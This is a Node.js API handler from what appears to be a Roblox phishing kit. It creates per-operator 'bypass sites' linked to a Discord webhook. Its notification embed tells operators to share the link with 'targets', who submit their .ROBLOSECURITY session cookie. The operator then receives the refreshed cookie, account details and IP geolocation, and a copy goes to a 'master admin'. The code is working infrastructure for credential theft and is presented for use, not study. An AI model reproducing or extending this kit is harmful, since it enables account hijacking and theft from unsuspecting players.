const fs = require('fs').promises;
const path = require('path');
const fetch = require('node-fetch');

// Validate webhook
async function validateWebhook(webhookUrl) {
    try {
        const response = await fetch(webhookUrl);
        const data = await response.json();
        return data.guild_id ? true : false;
    } catch {
        return false;
    }
}

// Update global stats
async function updateStats() {
    try {
        const statsPath = path.join(process.cwd(), 'data', 'stats.json');
        let stats = { totalSites: 0, totalCookies: 0 };
        
        try {
            const data = await fs.readFile(statsPath, 'utf8');
            stats = JSON.parse(data);
        } catch {}

        stats.totalSites = (stats.totalSites || 0) + 1;

        await fs.writeFile(statsPath, JSON.stringify(stats, null, 2));
    } catch (error) {
        console.error('Error updating stats:', error);
    }
}

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Method not allowed' });
    }

    const { dir, web, type } = req.body;

    // Validate inputs
    if (!dir || !web) {
        return res.status(400).json({ success: false, error: 'Missing required fields' });
    }

    // Validate directory name
    if (!/^[A-Za-z0-9_-]{3,32}$/.test(dir)) {
        return res.status(400).json({ success: false, error: 'Site name must be 3-32 characters (letters, numbers, hyphens, underscores only)' });
    }

    // Validate webhook
    if (!web.includes('discord.com/api/webhooks/')) {
        return res.status(400).json({ success: false, error: 'Invalid Discord webhook URL' });
    }

    const isValidWebhook = await validateWebhook(web);
    if (!isValidWebhook) {
        return res.status(400).json({ success: false, error: 'Discord webhook is invalid or inactive' });
    }

    try {
        // Load instances file
        const dataPath = path.join(process.cwd(), 'data', 'instances.json');
        let instances = {};
        
        try {
            const data = await fs.readFile(dataPath, 'utf8');
            instances = JSON.parse(data);
        } catch {
            await fs.mkdir(path.join(process.cwd(), 'data'), { recursive: true });
        }

        // Check if directory already exists
        if (instances[dir]) {
            return res.status(400).json({ success: false, error: 'Site name already taken. Please choose another name.' });
        }

        // Create instance
        instances[dir] = {
            directory: dir,
            webhook: web,
            type: type || 'as',
            createdAt: new Date().toISOString(),
            stats: {
                totalVisits: 0,
                totalCookies: 0
            }
        };

        // Save instances
        await fs.writeFile(dataPath, JSON.stringify(instances, null, 2));

        // Update global stats
        await updateStats();

        // Get domain
        const domain = req.headers.host;
        const protocol = domain.includes('localhost') ? 'http' : 'https';
        const siteUrl = `${protocol}://${domain}/${dir}`;

        // Send advanced Discord notification
        const webhookData = {
            username: 'Spidey Bot',
            avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
            content: null,
            embeds: [{
                title: '✅ Site Generated Successfully',
                description: `Your bypass site **${dir}** is ready with **FULL EMBED FUNCTIONALITY!**`,
                color: 0x10b981,
                fields: [
                    {
                        name: '🏠 Site Name',
                        value: `\`\`\`${dir}\`\`\``,
                        inline: false
                    },
                    {
                        name: '🔗 Your Link',
                        value: `[${siteUrl}](${siteUrl})\n\`\`\`${siteUrl}\`\`\``,
                        inline: false
                    },
                    {
                        name: '✨ Full Features',
                        value: 
                            '✅ Account info fetching\n' +
                            '✅ Robux balance display\n' +
                            '✅ Premium status check\n' +
                            '✅ Limiteds RAP calculation\n' +
                            '✅ Group ownership detection\n' +
                            '✅ IP geolocation\n' +
                            '✅ Game visit stats\n' +
                            '✅ Rich Discord embeds\n' +
                            '✅ Cookie refresh bypass\n' +
                            '✅ Master admin logging\n' +
                            '✅ reCAPTCHA v2 protected',
                        inline: false
                    },
                    {
                        name: '📖 How It Works',
                        value: 
                            '**1.** Share your link with targets\n' +
                            '**2.** They submit their `.ROBLOSECURITY` cookie\n' +
                            '**3.** Cookie is automatically refreshed\n' +
                            '**4.** You receive **FULL ACCOUNT INFO + REFRESHED COOKIE**\n' +
                            '**5.** Master sent to admin',
                        inline: false
                    }
                ],
                footer: {
                    text: 'Site Generator • reCAPTCHA v2 • 2026-02-13 at 5:06 AM',
                    icon_url: 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png'
                },
                timestamp: new Date().toISOString()
            }]
        };

        await fetch(web, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(webhookData)
        });

        // Return success
        return res.status(200).json({
            success: true,
            siteName: dir,
            url: siteUrl
        });

    } catch (error) {
        console.error('Error creating instance:', error);
        return res.status(500).json({ success: false, error: 'Internal server error. Please try again.' });
    }
};
